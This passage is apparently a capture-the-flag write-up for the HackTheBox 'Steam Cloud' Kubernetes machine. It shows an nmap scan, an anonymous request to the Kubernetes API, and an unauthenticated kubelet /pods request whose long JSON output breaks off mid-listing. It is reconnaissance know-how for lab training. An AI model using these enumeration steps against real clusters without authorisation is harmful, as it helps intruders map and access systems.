# Steam Cloud
> Write-up author: jon-brandy
## STEPS:

> PORT SCANNING

```
┌──(brandy㉿bread-yolk)-[~]
└─$ nmap -p- -sVC 10.10.11.133 --min-rate 1000
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-04 04:50 PDT
Nmap scan report for 10.10.11.133
Host is up (0.024s latency).
Not shown: 65528 closed tcp ports (conn-refused)
PORT      STATE SERVICE          VERSION
22/tcp    open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 fcfb90ee7c73a1d4bf87f871e844c63c (RSA)
|   256 46832b1b01db71646a3e27cb536f81a1 (ECDSA)
|_  256 1d8dd341f3ffa437e8ac780889c2e3c5 (ED25519)
2379/tcp  open  ssl/etcd-client?
| tls-alpn: 
|_  h2
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=steamcloud
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2023-09-04T10:38:42
|_Not valid after:  2024-09-03T10:38:42
2380/tcp  open  ssl/etcd-server?
| tls-alpn: 
|_  h2
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=steamcloud
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2023-09-04T10:38:42
|_Not valid after:  2024-09-03T10:38:43
8443/tcp  open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: e03fcb20-4c12-491a-893f-6adfb04454e4
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 133183cc-26de-40a3-80ed-956fa5d78715
|     X-Kubernetes-Pf-Prioritylevel-Uid: df207222-fbeb-42ee-b526-763adaf111ed
|     Date: Mon, 04 Sep 2023 11:51:15 GMT
|     Content-Length: 212
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/nice ports,/Trinity.txt.bak"","reason":"Forbidden","details":{},"code":403}
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: b41f28a8-e8dc-4720-b484-9bd0be5e72c6
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 133183cc-26de-40a3-80ed-956fa5d78715
|     X-Kubernetes-Pf-Prioritylevel-Uid: df207222-fbeb-42ee-b526-763adaf111ed
|     Date: Mon, 04 Sep 2023 11:51:14 GMT
|     Content-Length: 185
|     {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot get path "/"","reason":"Forbidden","details":{},"code":403}
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: af7ae914-e616-437b-afeb-909f1a51398d
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 133183cc-26de-40a3-80ed-956fa5d78715
|     X-Kubernetes-Pf-Prioritylevel-Uid: df207222-fbeb-42ee-b526-763adaf111ed
|     Date: Mon, 04 Sep 2023 11:51:15 GMT
|     Content-Length: 189
|_    {"kind":"Status","apiVersion":"v1","metadata":{},"status":"Failure","message":"forbidden: User "system:anonymous" cannot options path "/"","reason":"Forbidden","details":{},"code":403}
|_http-title: Site doesn't have a title (application/json).
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
| Not valid before: 2023-09-03T10:38:39
|_Not valid after:  2026-09-03T10:38:39
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
10249/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
10250/tcp open  ssl/http         Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=steamcloud@1693823926
| Subject Alternative Name: DNS:steamcloud
| Not valid before: 2023-09-04T09:38:45
|_Not valid after:  2024-09-03T09:38:45
| tls-alpn: 
|   h2
|_  http/1.1
10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V=7.93%T=SSL%I=7%D=9/4%Time=64F5C4B2%P=x86_64-pc-linux-gnu
SF:%r(GetRequest,22F,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x20b41f28
SF:a8-e8dc-4720-b484-9bd0be5e72c6\r\nCache-Control:\x20no-cache,\x20privat
SF:e\r\nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x20no
SF:sniff\r\nX-Kubernetes-Pf-Flowschema-Uid:\x20133183cc-26de-40a3-80ed-956
SF:fa5d78715\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x20df207222-fbeb-42ee-b
SF:526-763adaf111ed\r\nDate:\x20Mon,\x2004\x20Sep\x202023\x2011:51:14\x20G
SF:MT\r\nContent-Length:\x20185\r\n\r\n{\"kind\":\"Status\",\"apiVersion\"
SF::\"v1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden:
SF:\x20User\x20\\\"system:anonymous\\\"\x20cannot\x20get\x20path\x20\\\"/\
SF:\\"\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n")%r(HTTPO
SF:ptions,233,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x20af7ae914-e616
SF:-437b-afeb-909f1a51398d\r\nCache-Control:\x20no-cache,\x20private\r\nCo
SF:ntent-Type:\x20application/json\r\nX-Content-Type-Options:\x20nosniff\r
SF:\nX-Kubernetes-Pf-Flowschema-Uid:\x20133183cc-26de-40a3-80ed-956fa5d787
SF:15\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x20df207222-fbeb-42ee-b526-763
SF:adaf111ed\r\nDate:\x20Mon,\x2004\x20Sep\x202023\x2011:51:15\x20GMT\r\nC
SF:ontent-Length:\x20189\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"v1\"
SF:,\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden:\x20Use
SF:r\x20\\\"system:anonymous\\\"\x20cannot\x20options\x20path\x20\\\"/\\\"
SF:\",\"reason\":\"Forbidden\",\"details\":{},\"code\":403}\n")%r(FourOhFo
SF:urRequest,24A,"HTTP/1\.0\x20403\x20Forbidden\r\nAudit-Id:\x20e03fcb20-4
SF:c12-491a-893f-6adfb04454e4\r\nCache-Control:\x20no-cache,\x20private\r\
SF:nContent-Type:\x20application/json\r\nX-Content-Type-Options:\x20nosnif
SF:f\r\nX-Kubernetes-Pf-Flowschema-Uid:\x20133183cc-26de-40a3-80ed-956fa5d
SF:78715\r\nX-Kubernetes-Pf-Prioritylevel-Uid:\x20df207222-fbeb-42ee-b526-
SF:763adaf111ed\r\nDate:\x20Mon,\x2004\x20Sep\x202023\x2011:51:15\x20GMT\r
SF:\nContent-Length:\x20212\r\n\r\n{\"kind\":\"Status\",\"apiVersion\":\"v
SF:1\",\"metadata\":{},\"status\":\"Failure\",\"message\":\"forbidden:\x20
SF:User\x20\\\"system:anonymous\\\"\x20cannot\x20get\x20path\x20\\\"/nice\
SF:x20ports,/Trinity\.txt\.bak\\\"\",\"reason\":\"Forbidden\",\"details\":
SF:{},\"code\":403}\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.87 seconds
```

1. Based from the nmap result, it's clear that we're exploiting kubernetes.
2. **Etcd**, is a kubernetes component.

> It listens on port 2379 as a client & port 2380 as a server.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/75f84365-ff85-406a-b417-ccb16be4f077)


> Kubernetes API listens on port 8443.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/4d104d28-e6b3-4c70-a693-eba7dbf6e3e7)


> By default, a Kubernetes extension (Kubelet) listens on port 10250.

![image](https://github.com/jon-brandy/hackthebox/assets/70703371/0f4a41d7-4ca1-4149-8628-04b8c824f6fe)


3. The API and kubelet service seems to be our interest now.

> CHECKING THE KUBERNETES API --> curl https://10.10.11.133:8443/ -k | adding -k flag to ignore SSL cert vaildation when making request to HTTPS.

```
┌──(brandy㉿bread-yolk)-[~]
└─$ curl https://10.10.11.133:8443/ -k
{
  "kind": "Status",
  "apiVersion": "v1",
  "metadata": {
    
  },
  "status": "Failure",
  "message": "forbidden: User \"system:anonymous\" cannot get path \"/\"",
  "reason": "Forbidden",
  "details": {
    
  },
  "code": 403
}
```

6. The results indicate that the request was made without proper authentication and anonymous access to kubernetes server is not allowed.
7. This means we need to be authenticated in order to access the /home path.

> LISTING PODS FOR KUBELET'S WORKER --> curl https://10.10.11.133:10250/pods -k

```
┌──(brandy㉿bread-yolk)-[~]
└─$ curl https://10.10.11.133:10250/pods -k
{"kind":"PodList","apiVersion":"v1","metadata":{},"items":[{"metadata":{"name":"kube-apiserver-steamcloud","namespace":"kube-system","selfLink":"/api/v1/namespaces/kube-system/pods/kube-apiserver-steamcloud","uid":"c1926d0465cd9de10197b95a2c359105","creationTimestamp":null,"labels":{"component":"kube-apiserver","tier":"control-plane"},"annotations":{"kubeadm.kubernetes.io/kube-apiserver.advertise-address.endpoint":"10.10.11.133:8443","kubernetes.io/config.hash":"c1926d0465cd9de10197b95a2c359105","kubernetes.io/config.seen":"2023-09-04T06:39:06.655938159-04:00","kubernetes.io/config.source":"file"}},"spec":{"volumes":[{"name":"ca-certs","hostPath":{"path":"/etc/ssl/certs","type":"DirectoryOrCreate"}},{"name":"etc-ca-certificates","hostPath":{"path":"/etc/ca-certificates","type":"DirectoryOrCreate"}},{"name":"k8s-certs","hostPath":{"path":"/var/lib/minikube/certs","type":"DirectoryOrCreate"}},{"name":"usr-local-share-ca-certificates","hostPath":{"path":"/usr/local/share/ca-certificates","type":"DirectoryOrCreate"}},{"name":"usr-share-ca-certificates","hostPath":{"path":"/usr/share/ca-certificates","type":"DirectoryOrCreate"}}],"containers":[{"name":"kube-apiserver","image":"k8s.gcr.io/kube-apiserver:v1.22.3","command":["kube-apiserver","--advertise-address=10.10.11.133","--allow-privileged=true","--authorization-mode=Node,RBAC","--client-ca-file=/var/lib/minikube/certs/ca.crt","--enable-admission-plugins=NamespaceLifecycle,LimitRanger,ServiceAccount,DefaultStorageClass,DefaultTolerationSeconds,NodeRestriction,MutatingAdmissionWebhook,ValidatingAdmissionWebhook,ResourceQuota","--enable-bootstrap-token-auth=true","--etcd-cafile=/var/lib/minikube/certs/etcd/ca.crt","--etcd-certfile=/var/lib/minikube/certs/apiserver-etcd-client.crt","--etcd-keyfile=/var/lib/minikube/certs/apiserver-etcd-client.key","--etcd-servers=https://127.0.0.1:2379","--kubelet-client-certificate=/var/lib/minikube/certs/apiserver-kubelet-client.crt","--kubelet-client-key=/var/lib/minikube/certs/apiserver-kubelet-client.key","--kubelet-preferred-address-types=InternalIP,ExternalIP,Hostname","--proxy-client-cert-file=/var/lib/minikube/certs/front-proxy-client.crt","--proxy-client-key-file=/var/lib/minikube/certs/front-proxy-client.key","--requestheader-allowed-names=front-proxy-client","--requestheader-client-ca-file=/var/lib/minikube/certs/front-proxy-ca.crt","--requestheader-extra-headers-prefix=X-Remote-Extra-","--requestheader-group-headers=X-Remote-Group","--requestheader-username-headers=X-Remote-User","--secure-port=8443","--service-account-issuer=https://kubernetes.default.svc.cluster.local","--service-account-key-file=/var/lib/minikube/certs/sa.pub","--service-account-signing-key-file=/var/lib/minikube/certs/sa.key","--service-cluster-ip-range=10.96.0.0/12","--tls-cert-file=/var/lib/minikube/certs/apiserver.crt","--tls-private-key-file=/var/lib/minikube/certs/apiserver.key"],"resources":{"requests":{"cpu":"250m"}},"volumeMounts":[{"name":"ca-certs","readOnly":true,"mountPath":"/etc/ssl/certs"},{"name":"etc-ca-certificates","readOnly":true,"mountPath":"/etc/ca-certificates"},{"name":"k8s-certs","readOnly":true,"mountPath":"/var/lib/minikube/certs"},{"name":"usr-local-share-ca-certificates","readOnly":true,"mountPath":"/usr/local/share/ca-certificates"},{"name":"usr-share-ca-certificates","readOnly":true,"mountPath":"/usr/share/ca-certificates"}],"livenessProbe":{"httpGet":{"path":"/livez","port":8443,"host":"10.10.11.133","scheme":"HTTPS"},"initialDelaySeconds":10,"timeoutSeconds":15,"periodSeconds":10,"successThreshold":1,"failureThreshold":8},"readinessProbe":{"httpGet":{"path":"/readyz","port":8443,"host":"10.10.11.133","scheme":"HTTPS"},"timeoutSeconds":15,"periodSeconds":1,"successThreshold":1,"failureThreshold":3},"startupProbe":{"httpGet":{"path":"/livez","port":8443,"host":"10.10.11.133","scheme":"HTTPS"},"initialDelaySeconds":10,"timeoutSeconds":15,"periodSeconds":10,"successThreshold":1,"failureThreshold":24},"terminationMessagePath":"/dev/termination-log","terminationMessagePolicy":"File","imagePullPolicy":"IfNotPresent"}],"restartPolicy":"Always","terminationGracePeriodSeconds":30,"dnsPolicy":"ClusterFirst","nodeName":"steamcloud","hostNetwork":true,"securityContext":{"seccompProfile":{"type":"RuntimeDefault"}},"schedulerName":"default-scheduler","tolerations":[{"operator":"Exists","effect":"NoExecute"}],"priorityClassName":"system-node-critical","enableServiceLinks":true},"status":{"phase":"Running","conditions":[{"type":"Initialized","status":"True","lastProbeTime":null,"lastTransitionTime":"2023-09-04T10:39:04Z"},{"type":"Ready","status":"True","lastProbeTime":null,"lastTransitionTime":"2023-09-04T10:39:17Z"},{"type":"ContainersReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2023-09-04T10:39:17Z"},{"type":"PodScheduled","status":"True","lastProbeTime":null,"lastTransitionTime":"2023-09-04T10:39:04Z"}],"hostIP":"10.10.11.133","podIP":"10.10.11.133","podIPs":[{"ip":"10.10.11.133"}],"startTime":"2023-09-04T10:39:04Z","containerStatuses":[{"name":"kube-apiserver","state":{"running":{"startedAt":"2023-09-04T10:38:48Z"}},"lastState":{},"ready":true,"restartCount":0,"image":"k8s.gcr.io/kube-apiserver:v1.22.3","imageID":"docker-pullable://k8s.gcr.io/kube-apiserver@sha256:6ee1c59e9c1fb570e7958e267a6993988eaa22448beb70d99de7afb21e862e9d","containerID":"docker://b15f6ed2d34f454a223d29772a0c96ac3a261301ffd9ba84adeccad85ae74ae4","started":true}],"qosClass":"Burstable"}},{"metadata":{"name":"kube-controller-manager-steamcloud","namespace":"kube-system","selfLink":"/api/v1/namespaces/kube-system/pods/kube-controller-manager-steamcloud","uid":"be2478237d1af444b624cb01f51f79c4","creationTimestamp":null,"labels":{"component":"kube-controller-manager","tier":"control-plane"},"annotations":{"kubernetes.io/config.hash":"be2478237d1af444b624cb01f51f79c4","kubernetes.io/config.seen":"2023-09-04T06:39:06.655940192-04:00","kubernetes.io/config.source":"file"}},"spec":{"volumes":[{"name":"ca-certs","hostPath":{"path":"/etc/ssl/certs","type":"DirectoryOrCreate"}},{"name":"etc-ca-certificates","hostPath":{"path":"/etc/ca-certificates","type":"DirectoryOrCreate"}},{"name":"flexvolume-dir","hostPath":{"path":"/usr/libexec/kubernetes/kubelet-plugins/volume/exec","type":"DirectoryOrCreate"}},{"name":"k8s-certs","hostPath":{"path":"/var/lib/minikube/certs","type":"DirectoryOrCreate"}},{"name":"kubeconfig","hostPath":{"path":"/etc/kubernetes/controller-manager.conf","type":"FileOrCreate"}},{"name":"usr-local-share-ca-certificates","hostPath":{"path":"/usr/local/share/ca-certificates","type":"DirectoryOrCreate"}},{"name":"usr-share-ca-certificates","hostPath":{"path":"/usr/share/ca-certificates","type":"DirectoryOrCreate"}}],"containers":[{"name":"kube-controller-manager","image":"k8s.gcr.io/kube-controller-manager:v1.22.3","command":["kube-controller-manager","--allocate-node-cidrs=true","--authentication-kubeconfig=/etc/kubernetes/controller-manager.conf","--authorization-kubeconfig=/etc/kubernetes/controller-manager.conf","--bind-address=127.0.0.1","--client-ca-file=/var/lib/minikube/certs/ca.crt","--cluster-cidr=10.244.0.0/16","--cluster-name=mk","--cluster-signing-cert-file=/var/lib/minikube/certs/ca.crt","--cluster-signing-key-file=/var/lib/minikube/certs/ca.key","--controllers=*,bootstrapsigner,tokencleaner","--kubeconfig=/etc/kubernetes/controller-manager.conf","--leader-elect=false","--port=0","--requestheader-client-ca-file=/var/lib/minikube/certs/front-proxy-ca.crt","--root-ca-file=/var/lib/minikube/certs/ca.crt","--service-account-private-key-file=/var/lib/minikube/certs/sa.key","--service-cluster-ip-range=10.96.0.0/12","--use-service-account-credentials=true"],"resources":{"requests":{"cpu":"200m"}},"volumeMounts":[{"name":"ca-certs","readOnly":true,"mountPath":"/etc/ssl/certs"},{"name":"etc-ca-certificates","readOnly":true,"mountPath":"/etc/ca-certificates"},{"name":"flexvolume-dir","mountPath":"/usr/libexec/kubernetes/kubelet-plugins/volume/exec"},{"name":"k8s-certs","readOnly":true,"mountPath":"/var/lib/minikube/certs"},{"name":"kubeconfig","readOnly":true,"mountPath":"/etc/kubernetes/controller-manager.conf"},{"name":"usr-local-share-ca-certificates","readOnly":true,"mountPath":"/usr/local/share/ca-certificates"},{"name":"usr-share-ca-certificates","readOnly":true,"mountPath":"/usr/share/ca-certificates"}],"livenessProbe":{"httpGet":{"path":"/healthz","port":10257,"host":"127.0.0.1","scheme":"HTTPS"},"initialDelaySeconds":10,"timeoutSeconds":15,"periodSeconds":10,"successThreshold":1,"failureThreshold":8},"startupProbe":{"httpGet":{"path":"/healthz","port":10257,"host":"127.0.0.1","scheme":"HTTPS"},"initialDelaySeconds":10,"timeoutSeconds":15,"periodSeconds":10,"successThreshold":1,"failureThreshold":24},"terminationMessagePath":"/dev/termination-log","terminationMessagePolicy":"File","imagePullPolicy":"IfNotPresent"}],"restartPolicy":"Always","terminationGracePeriodSeconds":30,"dnsPolicy":"ClusterFirst","nodeName":"steamcloud","hostNetwork":true,"securityContext":{"seccompProfile":{"type":"RuntimeDefault"}},"schedulerName":"default-scheduler","tolerations":[{"operator":"Exists","effect":"NoExecute"}],"priorityClassName":"system-node-critical","enableServiceLinks":true},"status":{"phase":"Running","conditions":[{"type":"Initialized","status":"True","lastProbeTime":null,"lastTransitionTime":"2023-09-04T10:39:04Z"},{"type":"Ready","status":"True","lastProbeTime":null,"lastTransitionTime":"2023-09-04T10:39:11Z"},{"type":"ContainersReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2023-09-04T10:39:11Z"},{"type":"PodScheduled","status":"True","lastProbeTime":null,"lastTransitionTime":"2023-09-04T10:39:04Z"}],"hostIP":"10.10.11.133","podIP":"10.10.11.133","podIPs":[{"ip":"10.10.11.133"}],"startTime":"2023-09-04T10:39:04Z","containerStatuses":[{"name":"kube-controller-manager","state":{"running":{"startedAt":"2023-09-04T10:38:48Z"}},"lastState":{},"ready":true,"restartCount":23,"image":"k8s.gcr.io/kube-controller-manager:v1.22.3","imageID":"docker-pullable://k8s.gcr.io/kube-controller-manager@sha256:e67dbfd3796b7ce04fee80acb52876928c290224a91862c5849c3ab0fa31ca78","containerID":"docker://813d32d091a118cd6dc687d8587effb27b489a1a3dba69492aed367cf6ac0dad","started":true}],"qosClass":"Burstable"}},{"metadata":{"name":"kube-scheduler-steamcloud","namespace":"kube-system","selfLink":"/api/v1/namespaces/kube-system/pods/kube-scheduler-steamcloud","uid":"3232b72c69e9f8bf518a7d727d878b27","creationTimestamp":null,"labels":{"component":"kube-scheduler","tier":"control-plane"},"annotations":{"kubernetes.io/config.hash":"3232b72c69e9f8bf518a7d727d878b27","kubernetes.io/config.seen":"2023-09-04T06:39:06.655941715-04:00","kubernetes.io/config.source":"file"}},"spec":{"volumes":[{"name":"kubeconfig","hostPath":{"path":"/etc/kubernetes/scheduler.conf","type":"FileOrCreate"}}],"containers":[{"name":"kube-scheduler","image":"k8s.gcr.io/kube-scheduler:v1.22.3","command":["kube-scheduler","--authentication-kubeconfig=/etc/kubernetes/scheduler.conf","--authorization-kubeconfig=/etc/kubernetes/scheduler.conf","--bind-address=127.0.0.1","--kubeconfig=/etc/kubernetes/scheduler.conf","--leader-elect=false","--port=0"],"resources":{"requests":{"cpu":"100m"}},"volumeMounts":[{"name":"kubeconfig","readOnly":true,"mountPath":"/etc/kubernetes/scheduler.conf"}],"livenessProbe":{"httpGet":{"path":"/healthz","port":10259,"host":"127.0.0.1","scheme":"HTTPS"},"initialDelaySeconds":10,"timeoutSeconds":15,"periodSeconds":10,"successThreshold":1,"failureThreshold":8},"startupProbe":{"httpGet":{"path":"/healthz","port":10259,"host":"127.0.0.1","scheme":"HTTPS"},"initialDelaySeconds":10,"timeoutSeconds":15,"periodSeconds":10,"successThreshold":1,"failureThreshold":24},"terminationMessagePath":"/dev/termination-log","terminationMessagePolicy":"File","imagePullPolicy":"IfNotPresent"}],"restartPolicy":"Always","terminationGracePeriodSeconds":30,"dnsPolicy":"ClusterFirst","nodeName":"steamcloud","hostNetwork":true,"securityContext":{"seccompProfile":{"type":"RuntimeDefault"}},"schedulerName":"default-scheduler","tolerations":[{"operator":"Exists","effect":"NoExecute"}],"priorityClassName":"system-node-critical","enableServiceLinks":true},"status":{"phase":"Running","conditions":[{"type":"Initialized","status":"True","lastProbeTime":null,"lastTransitionTime":"2023-09-04T10:39:07Z"},{"type":"Ready","status":"True","lastProbeTime":null,"lastTransitionTime":"2023-09-04T10:39:11Z"},{"type":"ContainersReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2023-09-04T10:39:11Z"},{"type":"PodScheduled","status":"True","lastProbeTime":null,"lastTransitionTime":"2023-09-04T10:39:07Z"}],"hostIP":"10.10.11.133","podIP":"10.10.11.133","podIPs":[{"ip":"10.10.11.133"}],"startTime":"2023-09-04T10:39:07Z","containerStatuses":[{"name":"kube-scheduler","state":{"running":{"startedAt":"2023-09-04T10:38:48Z"}},"lastState":{},"ready":true,"restartCount":22,"image":"k8s.gcr.io/kube-scheduler:v1.22.3","imageID":"docker-pullable://k8s.gcr.io/kube-scheduler@sha256:cac7ea67201a84c00f3e8d9be51877c25fb539055ac404c4a9d2dd4c79d3fdab","containerID":"docker://bea2ef2f49f8820ac60d40645d689b9c8f1248e938c20aa1425b1886afa88358","started":true}],"qosClass":"Burstable"}},{"metadata":{"name":"storage-provisioner","namespace":"kube-system","uid":"4b4818cb-73ef-49da-b7b1-c18471f29cb5","resourceVersion":"404","creationTimestamp":"2023-09-04T10:39:05Z","labels":{"addonmanager.kubernetes.io/mode":"Reconcile","integration-test":"storage-provisioner"},"annotations":{"kubectl.kubernetes.io/last-applied-configuration":"{\"apiVersion\":\"v1\",\"kind\":\"Pod\",\"metadata\":{\"annotations\":{},\"labels\":{\"addonmanager.kubernetes.io/mode\":\"Reconcile\",\"integration-test\":\"storage-provisioner\"},\"name\":\"storage-provisioner\",\"namespace\":\"kube-system\"},\"spec\":{\"containers\":[{\"command\":[\"/storage-provisioner\"],\"image\":\"gcr.io/k8s-minikube/storage-provisioner:v5\",\"imagePullPolicy\":\"IfNotPresent\",\"name\":\"storage-provisioner\",\"volumeMounts\":[{\"mountPath\":\"/tmp\",\"name\":\"tmp\"}]}],\"hostNetwork\":true,\"serviceAccountName\":\"storage-provisioner\",\"volumes\":[{\"hostPath\":{\"path\":\"/tmp\",\"type\":\"Directory\"},\"name\":\"tmp\"}]}}\n","kubernetes.io/config.seen":"2023-09-04T06:39:14.198898330-04:00","kubernetes.io/config.source":"api"},"managedFields":[{"manager":"kube-scheduler","operation":"Update","apiVersion":"v1","time":"2023-09-04T10:39:05Z","fieldsType":"FieldsV1","fieldsV1":{"f:status":{"f:conditions":{".":{},"k:{\"type\":\"PodScheduled\"}":{".":{},"f:lastProbeTime":{},"f:lastTransitionTime":{},"f:message":{},"f:reason":{},"f:status":{},"f:type":{}}}}},"subresource":"status"},{"manager":"kubectl-client-side-apply","operation":"Update","apiVersion":"v1","time":"2023-09-04T10:39:05Z","fieldsType":"FieldsV1","fieldsV1":{"f:metadata":{"f:annotations":{".":{},"f:kubectl.kubernetes.io/last-applied-configuration":{}},"f:labels":{".":{},"f:addonmanager.kubernetes.io/mode":{},"f:integration-test":{}}},"f:spec":{"f:containers":{"k:{\"name\":\"storage-provisioner\"}":{".":{},"f:command":{},"f:image":{},"f:imagePullPolicy":{},"f:name":{},"f:resources":{},"f:terminationMessagePath":{},"f:terminationMessagePolicy":{},"f:volumeMounts":{".":{},"k:{\"mountPath\":\"/tmp\"}":{".":{},"f:mountPath":{},"f:name":{}}}}},"f:dnsPolicy":{},"f:enableServiceLinks":{},"f:hostNetwork":{},"f:restartPolicy":{},"f:schedulerName":{},"f:securityContext":{},"f:serviceAccount":{},"f:serviceAccountName":{},"f:terminationGracePeriodSeconds":{},"f:volumes":{".":{},"k:{\"name\":\"tmp\"}":{".":{},"f:hostPath":{".":{},"f:path":{},"f:type":{}},"f:name":{}}}}}}]},"spec":{"volumes":[{"name":"tmp","hostPath":{"path":"/tmp","type":"Directory"}},{"name":"kube-api-access-2bptc","projected":{"sources":[{"serviceAccountToken":{"expirationSeconds":3607,"path":"token"}},{"configMap":{"name":"kube-root-ca.crt","items":[{"key":"ca.crt","path":"ca.crt"}]}},{"downwardAPI":{"items":[{"path":"namespace","fieldRef":{"apiVersion":"v1","fieldPath":"metadata.namespace"}}]}}],"defaultMode":420}}],"containers":[{"name":"storage-provisioner","image":"gcr.io/k8s-minikube/storage-provisioner:v5","command":["/storage-provisioner"],"resources":{},"volumeMounts":[{"name":"tmp","mountPath":"/tmp"},{"name":"kube-api-access-2bptc","readOnly":true,"mountPath":"/var/run/secrets/kubernetes.io/serviceaccount"}],"terminationMessagePath":"/dev/termination-log","terminationMessagePolicy":"File","imagePullPolicy":"IfNotPresent"}],"restartPolicy":"Always","terminationGracePeriodSeconds":30,"dnsPolicy":"ClusterFirst","serviceAccountName":"storage-provisioner","serviceAccount":"storage-provisioner","nodeName":"steamcloud","hostNetwork":true,"securityContext":{},"schedulerName":"default-scheduler","tolerations":[{"key":"node.kubernetes.io/not-ready","operator":"Exists","effect":"NoExecute","tolerationSeconds":300},{"key":"node.kubernetes.io/unreachable","operator":"Exists","effect":"NoExecute","tolerationSeconds":300}],"priority":0,"enableServiceLinks":true,"preemptionPolicy":"PreemptLowerPriority"},"status":{"phase":"Running","conditions":[{"type":"Initialized","status":"True","lastProbeTime":null,"lastTransitionTime":"2023-09-04T10:39:14Z"},{"type":"Ready","status":"True","lastProbeTime":null,"lastTransitionTime":"2023-09-04T10:39:47Z"},{"type":"ContainersReady","status":"True","lastProbeTime":null,"lastTransitionTime":"2023-09-04T10:39:47Z"},{"type":"PodScheduled","status":"True","lastProbeTime":null,"lastTransitionTime":"2023-09-04T10:39:14Z"}],"hostIP":"10.10.11.133","podIP":"10.10.11.133","podIPs":[{"ip":"10.10.11.133"}],"startTime":"2023-09-04T10:39:14Z","containerStatuses":[{"name":"storage-provisioner","state":{"running":{"startedAt":"2023-09-04T10:39:47Z"}},"lastState":{"terminated":{"exitCode":1,"reason":"Error","startedAt":"2023-09-04T10:39:15Z","finishedAt":"2023-09-04T10:39:45Z","containerID":"docker://11ab4675eaf1fee1863f985c17b2366dd256422b54a6388bd9e2dd6e46c9fa92"}},"ready":true,"restartCount":1,"image":"gcr.io/k8s-minikube/storage-provisioner:v5","imageID":"docker-pullable://gcr.io/k8s-minikube/storage-provisioner@sha256:18eb69d1418e854ad5a19e399310e52808a8321e4c441c1dddad8977a0d7a944","containerID":"docker://3bcf040f98d88fefc185d7f54fee73e2071de2e228a691dd1c3b3e62cd623199","started":true}],"qosClass":"BestEffort"}},{"metadata":{"name":"kube-proxy-g2jkm","generateName":"kube-proxy-","namespace":"kube-system","uid":"3e88d85b-f174-45c8-88c6-3ee8ccbe2c3e","resourceVersion":"432","creationTimestamp":"2023-09-04T10:39:14Z","labels":{"controller-revision-hash":"674d79d6f9","k8s-app":"kube-proxy","pod-template-generation":"1"},"annotations":{"kubernetes.io/config.seen":"2023-09-04T06:39:14.895147162-04:00","kubernetes.io/config.source":"api"},"ownerReferences":[{"apiVersion":"apps/v1","kind":"DaemonSet","name":"kube-proxy","uid":"6d4f8d93-b3c0-449a-8c31-3e2ccd506fbb","controller":true,"blockOwnerDeletion":true}],"managedFields":[{"manager":"kube-controller-manager","operation":"Update","apiVersion":"v1","time":"2023-09-04T10:39:14Z","fieldsType":"FieldsV1","fieldsV1":{"f:metadata":{"f:generateName":{},"f:labels":{".":{},"f:controller-revision-hash":{},"f:k8s-app":{},"f:pod-template-generation":{}},"f:ownerReferences":{".":{},"k:{\"uid\":\"6d4f8d93-b3c0-449a-8c31-3e2ccd506fbb\"}":{}}},"f:spec":{"f:affinity":{".":{},"f:nodeAffinity":{".":{},"f:requiredDuringSchedulingIgnoredDuringExecution":{}}},"f:containers":{"k:{\"name\":\"kube-proxy\"}":{".":{},"f:command":{},"f:env":{".":{},"k:{\"name\":\"NODE_NAME\"}":{".":{},"f:name":{},"f:valueFrom":{".":{},"f:fieldRef":{}}}},"